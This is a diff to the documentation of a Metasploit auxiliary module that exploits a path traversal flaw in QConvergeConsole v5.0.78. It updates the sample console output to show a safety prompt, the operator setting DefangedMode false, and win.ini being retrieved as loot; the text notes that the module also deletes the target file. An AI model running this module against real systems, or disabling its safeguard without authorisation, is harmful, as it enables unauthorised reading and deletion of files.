@@ -44,17 +44,31 @@ Example: C:\Windows
 
 ## Scenarios
 
-Running the exploit against v5.0.78 on Windows 22H22 should result in an output similar to the following:
+Running the exploit against v5.0.78 on Windows Server 2019 should result in an output similar to the following:
 
 ```
 msf auxiliary(gather/qconvergeconsole_traversal) > run
-[*] Running module against 192.168.137.238
+[*] Running module against 10.5.135.134
 [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target appears to be vulnerable. Vulnerable version detected: v5.0.78
-[+] File retrieved: C:\Windows\win.ini
-[*] File saved as loot: /home/asdf/.msf4/loot/20260416003715_default_192.168.137.238_qconvergeconsole_558041.txt
-[*] Auxiliary module execution completed
+[+] The target appears to be vulnerable. Vulnerable version detected: 5.0.78
+[-] Auxiliary aborted due to failure: bad-config: Are you *SURE* you want to execute the module against the target?
+Running this module will attempt to read and delete the file
+specified by TARGET_FILE on the remote system.
 
+If you have explicit authorisation, re-run with:
+    set DefangedMode false
+
+[*] Auxiliary module execution completed
+msf auxiliary(gather/qconvergeconsole_traversal) > set DefangedMode false
+DefangedMode => false
+msf auxiliary(gather/qconvergeconsole_traversal) > run
+[*] Running module against 10.5.135.134
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Vulnerable version detected: 5.0.78
+[+] File retrieved: C:\Windows/win.ini
+[*] File saved as loot: /home/kali/.msf4/loot/20260512051343_default_10.5.135.134_qconvergeconsole_629527.ini
+[*] Auxiliary module execution completed
+msf auxiliary(gather/qconvergeconsole_traversal) > exit
 ```
 
 The file will be stored as loot:
